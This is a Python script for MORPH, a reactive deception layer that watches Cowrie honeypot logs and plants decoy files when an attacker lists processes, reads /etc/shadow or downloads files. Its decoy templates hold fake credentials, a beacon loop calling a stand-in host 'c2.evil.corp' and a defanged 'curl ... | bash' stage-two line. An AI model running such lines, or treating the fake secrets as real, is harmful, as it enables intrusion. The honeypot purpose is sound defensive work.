#!/usr/bin/env python3
"""
MORPH - Reactive Deception Layer

Watches Cowrie logs in real-time and plants fake files into honeyfs/
based on attacker behavior.

Usage:
    python3 reactor.py
"""

import json
import random
import string
import threading
import time
import traceback
from datetime import datetime
from pathlib import Path
from typing import Callable, Any

# Paths
COWRIE_LOG = "/home/cowrie/cowrie/var/log/cowrie/cowrie.json"
HONEYFS_ROOT = "/home/cowrie/cowrie/honeyfs"
REACTOR_LOG = Path(__file__).parent / "reactor.log"

# Polling interval in seconds
POLL_INTERVAL = 1.0

# Track file position for tail-like behavior
_file_position = 0
_position_lock = threading.Lock()

# Control flag for the polling thread
_running = False
_poll_thread: threading.Thread | None = None


def _log(message: str) -> None:
    """Log a reactor action."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {message}\n"
    
    try:
        with open(REACTOR_LOG, "a", encoding="utf-8") as f:
            f.write(log_entry)
    except Exception as e:
        print(f"ERROR writing to log: {e}")
    
    print(log_entry.strip())


def _write_honeyfs_file(relative_path: str, content: str) -> bool:
    """Write a file into honeyfs."""
    full_path = Path(HONEYFS_ROOT) / relative_path
    
    if full_path.exists():
        _log(f"File already exists, skipping: {relative_path}")
        return False
    
    try:
        full_path.parent.mkdir(parents=True, exist_ok=True)
    except Exception as e:
        _log(f"ERROR creating parent dirs for {relative_path}: {e}\n{traceback.format_exc()}")
        return False
    
    try:
        with open(full_path, "w", encoding="utf-8") as f:
            f.write(content)
        _log(f"Created: {relative_path} ({len(content)} bytes)")
        return True
    except Exception as e:
        _log(f"ERROR writing {relative_path}: {e}\n{traceback.format_exc()}")
        return False


def _create_empty_file(relative_path: str) -> bool:
    """Create an empty file in honeyfs."""
    full_path = Path(HONEYFS_ROOT) / relative_path
    
    if full_path.exists():
        _log(f"File already exists, skipping: {relative_path}")
        return False
    
    try:
        full_path.parent.mkdir(parents=True, exist_ok=True)
    except Exception as e:
        _log(f"ERROR creating parent dirs for {relative_path}: {e}\n{traceback.format_exc()}")
        return False
    
    try:
        full_path.touch()
        _log(f"Created (empty): {relative_path}")
        return True
    except Exception as e:
        _log(f"ERROR creating {relative_path}: {e}\n{traceback.format_exc()}")
        return False


def _random_string(length: int = 8) -> str:
    """Generate a random alphanumeric string."""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


# === Fake Content Templates ===

FAKE_CONFIG_PHP = """<?php
// Database configuration - Production
// Last updated: 2024-03-10

define('DB_HOST', 'db.internal.corp');
define('DB_NAME', 'webapp_prod');
define('DB_USER', 'webapp_admin');
define('DB_PASS', 'Pr0d_DB_P@ss_2024!');

// API Keys
define('STRIPE_SECRET', 'sk_live_51HG8k2CjEXAMPLEKEY');
define('AWS_KEY', 'AKIAIOSFODNN7EXAMPLE');

// Debug mode - DISABLE IN PRODUCTION
define('DEBUG', false);

$conn = new mysqli(DB_HOST, DB_USER, DB_PASS, DB_NAME);
?>
"""

FAKE_GIT_CONFIG = """[core]
\trepositoryformatversion = 0
\tfilemode = true
\tbare = false
\tlogallrefupdates = true
[remote "origin"]
\turl = git@github.com:internal-corp/webapp-prod.git
\tfetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
\tremote = origin
\tmerge = refs/heads/main
[user]
\tname = Deploy Bot
\temail = deploy@internal.corp
"""

FAKE_MONITOR_SCRIPT = """#!/bin/bash
# Persistence monitor - DO NOT REMOVE
# Contact: admin@internal.corp

while true; do
    curl -s http://c2.evil.corp/heartbeat?id=$(hostname) > /dev/null 2>&1
    sleep 300
done
"""

FAKE_SSH_KEY = """ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7z8k3N5F5L... (truncated) deploy@internal.corp
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDk9p2R7T... (truncated) backup@internal.corp
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... jenkins@ci.internal.corp
"""

FAKE_BASH_HISTORY = """cd /var/www/html
cat config.php
mysql -u root -p'R00t_DB_P@ss!' webapp_prod
mysqldump webapp_prod > /tmp/dump.sql
scp /tmp/dump.sql backup@10.0.0.5:/backups/
rm /tmp/dump.sql
curl -O http://updates.internal.corp/deploy.sh
chmod +x deploy.sh
./deploy.sh
history -c
"""

FAKE_BACKUP_SCRIPT = """#!/bin/bash
# Nightly backup script
# Runs via cron at 2:00 AM

BACKUP_DIR="/opt/backup"
DB_USER="backup_svc"
DB_PASS="B@ckup_2024_Secure!"
DB_NAME="production"

DATE=$(date +%Y%m%d)

mysqldump -u$DB_USER -p$DB_PASS $DB_NAME | gzip > $BACKUP_DIR/db_backup_$DATE.sql.gz

# Sync to remote
rsync -avz $BACKUP_DIR/ backup@storage.internal.corp:/archives/

# Cleanup old backups (keep 30 days)
find $BACKUP_DIR -name "*.sql.gz" -mtime +30 -delete
"""

FAKE_MALWARE_PLACEHOLDER = """#!/bin/bash
# Dropped payload - detected and neutered
# Original hash: {hash}
# Detected: {date}

echo "Payload intercepted by security team"
exit 0

# --- Original content below (defanged) ---
# curl http://malware.evil.corp/stage2.sh | bash
# This system has been cleaned.
"""


# === Reaction Handlers ===

def react_to_www(cmd: str, session_id: str) -> None:
    """React to /var/www exploration."""
    _log(f"[{session_id}] Triggered: www exploration ({cmd})")
    _write_honeyfs_file("var/www/html/config.php", FAKE_CONFIG_PHP)
    _write_honeyfs_file("var/www/html/.git/config", FAKE_GIT_CONFIG)


def react_to_process_list(cmd: str, session_id: str) -> None:
    """React to process listing commands."""
    _log(f"[{session_id}] Triggered: process listing ({cmd})")
    _write_honeyfs_file("tmp/.monitor", FAKE_MONITOR_SCRIPT)


def react_to_passwd_access(cmd: str, session_id: str) -> None:
    """React to password file access."""
    _log(f"[{session_id}] Triggered: passwd/shadow access ({cmd})")
    _write_honeyfs_file("home/deploy/.ssh/authorized_keys", FAKE_SSH_KEY)
    _write_honeyfs_file("home/deploy/.bash_history", FAKE_BASH_HISTORY)


def react_to_file_search(cmd: str, session_id: str) -> None:
    """React to find/locate commands."""
    _log(f"[{session_id}] Triggered: file search ({cmd})")
    _create_empty_file("opt/backup/db_backup_2024.sql.gz")
    _write_honeyfs_file("opt/scripts/backup.sh", FAKE_BACKUP_SCRIPT)


def react_to_download(cmd: str, session_id: str) -> None:
    """React to wget/curl downloads."""
    _log(f"[{session_id}] Triggered: download attempt ({cmd})")
    fake_name = f".{_random_string(6)}.sh"
    fake_content = FAKE_MALWARE_PLACEHOLDER.format(
        hash=_random_string(32),
        date=datetime.now().strftime("%Y-%m-%d %H:%M")
    )
    _write_honeyfs_file(f"tmp/{fake_name}", fake_content)


# === Reaction Rules ===

REACTION_RULES: list[tuple[list[str], Callable]] = [
    (["ls /var/www", "cd /var/www", "ls -la /var/www"], react_to_www),
    (["ps aux", "ps -ef", "top", "htop"], react_to_process_list),
    (["cat /etc/passwd", "cat /etc/shadow"], react_to_passwd_access),
    (["find /", "find .", "locate "], react_to_file_search),
    (["wget ", "curl -O", "curl http", "wget http"], react_to_download),
]


def check_reactions(command: str, session_id: str) -> None:
    """Check if a command triggers any reactions."""
    cmd_lower = command.lower()
    
    for patterns, handler in REACTION_RULES:
        for pattern in patterns:
            if pattern.lower() in cmd_lower:
                handler(command, session_id)
                return


def process_event(event: dict[str, Any]) -> None:
    """Process a single Cowrie log event and trigger reactions."""
    session_id = event.get("session", "unknown")
    command = event.get("input", "")
    
    if command:
        check_reactions(command, session_id)


def _process_new_lines() -> None:
    """Read and process any new lines appended to the log file."""
    global _file_position
    
    log_path = Path(COWRIE_LOG)
    if not log_path.exists():
        return
    
    try:
        with _position_lock:
            with open(COWRIE_LOG, "r", encoding="utf-8") as f:
                f.seek(_file_position)
                new_lines = f.readlines()
                _file_position = f.tell()
        
        for line in new_lines:
            line = line.strip()
            if not line:
                continue
            
            try:
                event = json.loads(line)
                process_event(event)
            except json.JSONDecodeError:
                continue
    
    except IOError as e:
        _log(f"Error reading log: {e}")


def _poll_loop() -> None:
    """Background polling loop that checks for new log lines."""
    global _running
    
    _log("Polling loop started")
    
    while _running:
        _process_new_lines()
        time.sleep(POLL_INTERVAL)
    
    _log("Polling loop stopped")


def _init_file_position() -> None:
    """Initialize file position to end of file (only process new events)."""
    global _file_position
    
    log_path = Path(COWRIE_LOG)
    if log_path.exists():
        _file_position = log_path.stat().st_size
        _log(f"Starting at end of log (position {_file_position})")
    else:
        _file_position = 0
        _log("Log file not found, will poll for creation")


def start_reactor() -> threading.Thread:
    """Start the reactor polling thread. Returns the Thread instance."""
    global _running, _poll_thread
    
    _log("=" * 60)
    _log("MORPH Reactor starting")
    _log(f"Watching: {COWRIE_LOG}")
    _log(f"Honeyfs: {HONEYFS_ROOT}")
    _log(f"Poll interval: {POLL_INTERVAL}s")
    _log("=" * 60)
    
    # Ensure honeyfs directory exists
    Path(HONEYFS_ROOT).mkdir(parents=True, exist_ok=True)
    
    # Start at end of file
    _init_file_position()
    
    # Start polling thread
    _running = True
    _poll_thread = threading.Thread(target=_poll_loop, daemon=True)
    _poll_thread.start()
    
    _log("Reactor started - polling for attacker commands")
    
    return _poll_thread


def stop_reactor() -> None:
    """Stop the reactor polling thread."""
    global _running, _poll_thread
    
    _log("Stopping MORPH Reactor")
    _running = False
    
    if _poll_thread and _poll_thread.is_alive():
        _poll_thread.join(timeout=5)
    
    _poll_thread = None
    _log("Reactor stopped")


if __name__ == "__main__":
    print("MORPH Reactor - Real-time Deception Layer")
    print("=" * 60)
    print(f"Monitoring: {COWRIE_LOG}")
    print(f"Honeyfs:    {HONEYFS_ROOT}")
    print(f"Log file:   {REACTOR_LOG}")
    print()
    print("Press Ctrl+C to stop")
    print("=" * 60)
    print()
    
    start_reactor()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nShutting down...")
        stop_reactor()
        print("Done.")
